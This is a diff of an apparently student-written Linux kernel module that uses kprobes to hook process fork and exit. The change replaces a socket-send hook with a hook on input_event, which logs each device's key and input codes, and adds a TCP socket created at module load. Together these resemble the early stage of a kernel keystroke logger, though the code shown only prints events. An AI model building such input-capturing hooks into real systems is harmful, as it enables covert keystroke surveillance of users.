@@ -8,14 +8,14 @@
  */
 
 #include "headers.h"
-/*#include "protocol.h"*/
+#include "protocol.h"
 
-#define HOOK_MSG_SEND "sock_sendmsg"
+#define HOOK_INPUT_EVENT "input_event"
 #define HOOK_PROCESS_EXIT "do_exit"
 #define HOOK_PROCESS_FORK "kernel_clone" // Originally named 'do_fork'
 					 // Linux newer versions use 'kernel clone'
-/* #define HOOK_FILE_OPEN "do_sys_openat" - Not used, OS opens files frequently
- * 				 	    Hooking such function will crash the computer
+/* #define HOOK_FILE_OPEN "do_sys_openat", "__sys_sendmsg" - Not used, OS frequently uses this functions
+ * 				 	    		     Hooking such function will crash the computer
  */
 
 
@@ -25,15 +25,18 @@ MODULE_DESCRIPTION("Final project");
 
 static int handler_pre_do_fork(struct kprobe*, struct pt_regs*);
 static int handler_pre_do_exit(struct kprobe*, struct pt_regs*);
-static int handler_pre_msg_send(struct kprobe*, struct pt_regs*);
+static int handler_pre_input_event(struct kprobe*, struct pt_regs*);
 static int register_probes(void);
 static void unregister_probes(int);
 
 /* Enum of all kprobes, each kprobe value is the index inside the array */
-typedef enum {kp_do_fork, kp_do_exit, kp_msg_send, PROBES_SIZE} kernel_probes;
+typedef enum {kp_do_fork, kp_do_exit, kp_input_event, PROBES_SIZE} kernel_probes;
 
 /* Kprobes structures */
 static struct kprobe kps[PROBES_SIZE] = {0};
+
+/* Global socket */
+static struct socket *sock;
 
 /* Fork hook */
 static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs)
@@ -55,16 +58,16 @@ static int handler_pre_do_exit(struct kprobe *kp, struct pt_regs *regs)
 	return 0;
 }
 
-/* Socket creation */
-static int handler_pre_msg_send(struct kprobe *kp, struct pt_regs *regs)
+/* Device input events */
+static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs)
 {
-	struct socket *sock = (struct socket *)regs->di; // First parameter passed 
-							 // Through di register
-	printk(KERN_INFO "Got to msg_send\n"); // Remove later
-	if ( !sock || !sock->sk || !sock->sk->sk_daddr || !current )
+	if ( !regs ) // Checking current is irrelevant due to interrupts
 		return 0;
 
-	printk(KERN_INFO "Message was sent to %d from %s\n", sock->sk->sk_daddr, current->comm);
+	struct input_dev *dev = (struct input_dev *)regs->di; // First parameter
+	unsigned int code = (unsigned int)regs->dx; 	      // Third paramater
+	
+	printk(KERN_INFO "Device Named: %s | Device code: %d\n", dev->name, code);
 	return 0;
 }
 
@@ -99,15 +102,14 @@ static int register_probes(void)
         }
 
 	/* Set up sending message using socket */
-	kps[kp_msg_send].pre_handler = handler_pre_msg_send;
-	kps[kp_msg_send].symbol_name = HOOK_MSG_SEND;
+	kps[kp_input_event].pre_handler = handler_pre_input_event;
+	kps[kp_input_event].symbol_name = HOOK_INPUT_EVENT;
 
-	ret = register_kprobe(&kps[kp_msg_send]);
-	printk(KERN_INFO "Registered msg send\n");
+	ret = register_kprobe(&kps[kp_input_event]);
 	if (ret < 0)
 	{
-		unregister_probes(kp_msg_send);
-		printk(KERN_INFO "Failed to register %s, banana\n", kps[kp_msg_send].symbol_name);
+		unregister_probes(kp_input_event);
+		printk(KERN_INFO "Failed to register %s, banana\n", kps[kp_input_event].symbol_name);
 		goto end;
 	}
         printk(KERN_INFO "Finished hooking succusfully\n");
@@ -141,9 +143,8 @@ static void unregister_probes(int max_probes)
 
 static int __init hook_init(void)
 {
-	int ret;
-
-	/* More logic */
+	int ret;	
+	sock = tcp_sock_create();
 
 	ret = register_probes();
 	if (ret < 0)
